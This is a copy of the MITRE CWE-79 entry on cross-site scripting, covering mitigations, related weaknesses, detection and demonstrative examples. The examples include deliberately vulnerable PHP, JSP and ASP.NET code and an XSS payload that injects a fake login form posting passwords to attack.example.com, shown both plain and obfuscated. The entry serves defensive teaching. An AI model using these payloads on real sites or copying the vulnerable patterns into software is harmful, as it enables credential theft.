# CWE-79_xss
# Sursa: https://cwe.mitre.org/data/definitions/79.html
# Data accesarii: 2026-05-31

## Description
Description
The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.
## Alternate_Terms
Alternate Terms
XSS
A common abbreviation for Cross-Site Scripting.
HTML Injection
Used as a synonym of stored (Type 2) XSS.
Reflected XSS / Non-Persistent XSS / Type 1 XSS
Used when a server application reads data directly from the HTTP request and reflects it back in the HTTP response.
Stored XSS / Persistent XSS / Type 2 XSS
Used when a server-side application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content.
DOM-Based XSS / Type 0 XSS
Used when a client-side application performs the injection of XSS into the page by manipulating the Domain Object Model (DOM).
CSS
In the early years after initial discovery of XSS, "CSS" was a commonly-used acronym.  However, this would cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.
## Potential_Mitigations
Potential Mitigations
Phase(s)
Mitigation
Architecture and Design
Strategy:
Libraries or Frameworks
Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid [
REF-1482
].
Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.
Implementation; Architecture and Design
Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.
For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.
Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:
HTML body
Element attributes (such as src="XYZ")
URIs
JavaScript sections
Cascading Style Sheets and style property
etc. Note that HTML Entity Encoding is only appropriate for the HTML body.
Consult the XSS Prevention Cheat Sheet [
REF-724
] for more details on the types of encoding and escaping that are needed.
Architecture and Design; Implementation
Strategy:
Attack Surface Reduction
Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.
Effectiveness: Limited
Note:
This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.
Architecture and Design
For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid
CWE-602
. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
Architecture and Design
Strategy:
Parameterization
If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.
Implementation
Strategy:
Output Encoding
Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
Implementation
With Struts, write all data from form beans with the bean's filter attribute set to true.
Implementation
Strategy:
Attack Surface Reduction
To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XmlHttpRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
Effectiveness: Defense in Depth
Implementation
Strategy:
Input Validation
Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."
Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.
Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("<3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "<" character, which would need to be escaped or otherwise handled. In this case, stripping the "<" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.
Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.
Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
Architecture and Design
Strategy:
Enforcement by Conversion
When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
Operation
Strategy:
Firewall
Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth [
REF-1481
].
Effectiveness: Moderate
Note:
An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.
Operation; Implementation
Strategy:
Environment Hardening
When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as
CWE-95
,
CWE-621
, and similar issues.
## Relationships
Relationships
This table shows the weaknesses and high level categories that are related to this
                            weakness. These relationships are defined as ChildOf, ParentOf, MemberOf and give insight to
                            similar items that may exist at higher and lower levels of abstraction. In addition,
                            relationships such as PeerOf and CanAlsoBe are defined to show similar weaknesses that the user
                            may want to explore.
Relevant to the view "Research Concepts" (View-1000)
Nature
Type
ID
Name
ChildOf
Class - a weakness that is described in a very abstract fashion, typically independent of any specific language or technology. More specific than a Pillar Weakness, but more general than a Base Weakness. Class level weaknesses typically describe issues in terms of 1 or 2 of the following dimensions: behavior, property, and resource.
74
Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
80
Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
81
Improper Neutralization of Script in an Error Message Web Page
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
83
Improper Neutralization of Script in Attributes in a Web Page
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
84
Improper Neutralization of Encoded URI Schemes in a Web Page
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
85
Doubled Character XSS Manipulations
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
86
Improper Neutralization of Invalid Characters in Identifiers in Web Pages
ParentOf
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
87
Improper Neutralization of Alternate XSS Syntax
PeerOf
Composite - a Compound Element that consists of two or more distinct weaknesses, in which all weaknesses must be present at the same time in order for a potential vulnerability to arise. Removing any of the weaknesses eliminates or sharply reduces the risk. One weakness, X, can be "broken down" into component weaknesses Y and Z. There can be cases in which one weakness might not be essential to a composite, but changes the nature of the composite when it becomes a vulnerability.
352
Cross-Site Request Forgery (CSRF)
CanFollow
Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology. More specific than a Base weakness. Variant level weaknesses typically describe issues in terms of 3 to 5 of the following dimensions: behavior, property, technology, language, and resource.
113
Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')
CanFollow
Base - a weakness that is still mostly independent of a resource or technology, but with sufficient details to provide specific methods for detection and prevention. Base level weaknesses typically describe issues in terms of 2 or 3 of the following dimensions: behavior, property, technology, language, and resource.
184
Incomplete List of Disallowed Inputs
CanPrecede
Base - a weakness that is still mostly independent of a resource or technology, but with sufficient details to provide specific methods for detection and prevention. Base level weaknesses typically describe issues in terms of 2 or 3 of the following dimensions: behavior, property, technology, language, and resource.
494
Download of Code Without Integrity Check
Relevant to the view "Software Development" (View-699)
Nature
Type
ID
Name
MemberOf
Category - a CWE entry that contains a set of other entries that share a common characteristic.
137
Data Neutralization Issues
Relevant to the view "Weaknesses for Simplified Mapping of Published Vulnerabilities" (View-1003)
Nature
Type
ID
Name
ChildOf
Class - a weakness that is described in a very abstract fashion, typically independent of any specific language or technology. More specific than a Pillar Weakness, but more general than a Base Weakness. Class level weaknesses typically describe issues in terms of 1 or 2 of the following dimensions: behavior, property, and resource.
74
Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')
Relevant to the view "Architectural Concepts" (View-1008)
Nature
Type
ID
Name
MemberOf
Category - a CWE entry that contains a set of other entries that share a common characteristic.
1019
Validate Inputs
## Modes_Of_Introduction
Modes
        Of Introduction
The different Modes of Introduction provide information
                        about how and when this
                        weakness may be introduced. The Phase identifies a point in the life cycle at which
                        introduction
                        may occur, while the Note provides a typical scenario related to introduction during the
                        given
                        phase.
Phase
Note
Implementation
REALIZATION: This weakness is caused during implementation of an architectural security tactic.
## Applicable_Platforms
Applicable Platforms
This listing shows possible areas for which the given
                        weakness could appear. These
                        may be for specific named Languages, Operating Systems, Architectures, Paradigms,
                        Technologies,
                        or a class of such platforms. The platform is listed along with how frequently the given
                        weakness appears for that instance.
Languages
Class: Not Language-Specific
(Undetermined Prevalence)
Technologies
AI/ML
(Undetermined Prevalence)
Class: Web Based
(Often Prevalent)
Web Server
(Undetermined Prevalence)
## Demonstrative_Examples
Demonstrative Examples
Example 1
The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).
(bad code)
Example Language:
PHP
$username = $_GET['username'];
echo '<div class="header"> Welcome, ' . $username . '</div>';
Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as
(attack code)
http://trustedSite.example.com/welcome.php?username=<Script Language="Javascript">alert("You've been attacked!");</Script>
This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.
More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:
(attack code)
http://trustedSite.example.com/welcome.php?username=<div id="stealPassword">Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><br/><input type="submit" value="Login" /></form></div>
If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:
(result)
<div class="header"> Welcome, <div id="stealPassword"> Please Login:
<form name="input" action="attack.example.com/stealPassword.php" method="post">
Username: <input type="text" name="username" /><br/>
Password: <input type="password" name="password" /><br/>
<input type="submit" value="Login" />
</form>
</div></div>
The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):
(attack code)
trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
The same attack string could also be obfuscated as:
(attack code)
trustedSite.example.com/welcome.php?username=<script+type="text/javascript">
document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>
Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.
Example 2
The following code displays a Reflected XSS (Type 1) scenario.
The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.
(bad code)
Example Language:
JSP
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>
The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.
(bad code)
Example Language:
ASP.NET
<%
protected System.Web.UI.WebControls.TextBox Login;
protected System.Web.UI.WebControls.Label EmployeeID;
...
EmployeeID.Text = Login.Text;
%>
<p><asp:label id="EmployeeID" runat="server" /></p>
The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.
Example 3
The following code displays a Stored XSS (Type 2) scenario.
The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.
(bad code)
Example Language:
JSP
<%Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
rs.next();
String name = rs.getString("name");
}%>
Employee Name: <%= name %>
The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.
(bad code)
Example Language:
ASP.NET
<%
protected System.Web.UI.WebControls.Label EmployeeName;
...
string query = "select * from emp where id=" + eid;
sda = new SqlDataAdapter(query, conn);
sda.Fill(dt);
string name = dt.Rows[0]["Name"];
...
EmployeeName.Text = name;%>
<p><asp:label id="EmployeeName" runat="server" /></p>
This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.
Example 4
The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.
CreateUser.php
(bad code)
Example Language:
PHP
$username = mysql_real_escape_string($username);
$fullName = mysql_real_escape_string($fullName);
$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;
mysql_query($query);
/.../
The code is careful to avoid a SQL injection attack (
CWE-89
) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:
ListUsers.php
(bad code)
Example Language:
PHP
$query = 'Select * From users Where loggedIn=true';
$results = mysql_query($query);
if (!$results) {
exit;
}
//Print list of users to page
echo '<div id="userlist">Currently Active Users:';
while ($row = mysql_fetch_assoc($results)) {
echo '<div class="userNames">'.$row['fullname'].'</div>';
}
echo '</div>';
The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.
Example 5
The following code is a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:
(bad code)
Example Language:
PHP
$name = $_COOKIE["myname"];
$announceStr = "$name just logged in.";
//save HTML-formatted message to file; implementation details are irrelevant for this example.
saveMessage($announceStr);
An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:
(attack code)
<script>document.alert('Hacked');</script>
The raw contents of the message file would look like:
(result)
<script>document.alert('Hacked');</script> has logged in.
For each person who visits the message page, their browser would execute the script, generating a pop-up window that says "Hacked". More malicious attacks are possible; see the rest of this entry.
Example 6
The following code attempts to stop XSS attacks by removing all occurences of "script" in an input string.
(bad code)
Example Language:
Java
public String removeScriptTags(String input, String mask) {
return input.replaceAll("script", mask);
}
Because the code only checks for the lower-case "script" string, it can be easily defeated with upper-case script tags.
## Detection_Methods
Detection
        Methods
Method
Details
Automated Static Analysis
Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.
Effectiveness: Moderate
Black Box
Use the XSS Cheat Sheet [
REF-714
] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.
Effectiveness: Moderate
Note:
With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.